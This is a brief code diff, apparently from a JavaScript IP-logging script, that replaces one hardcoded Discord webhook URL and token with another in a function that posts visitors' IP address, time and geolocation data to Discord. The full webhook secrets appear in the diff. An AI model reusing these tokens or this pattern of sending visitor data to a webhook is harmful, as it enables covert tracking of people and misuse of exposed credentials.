@@ -51,7 +51,7 @@ function createMessage(ipAddress, dateTimeString, geoData) {
 }
 
 function sendToDiscord(message) {
-  const webhookUrl = 'https://discord.com/api/webhooks/1112106803765981329/F2ZlS_49qu_IA0wfgg79m7oYPLFMAzGRrwh_njh50636BPjnmPs8P_F5Zdgss63Mna8D';
+  const webhookUrl = 'https://discord.com/api/webhooks/1112485667105157250/Fdn-HkD6bu7AFkJq4AMAEy9hiP3Nn9OWgeaKLoITdeNOAyA9ymXiHx0bK6IrAcd4NSGx';
 
   fetch(webhookUrl, {
     method: 'POST',
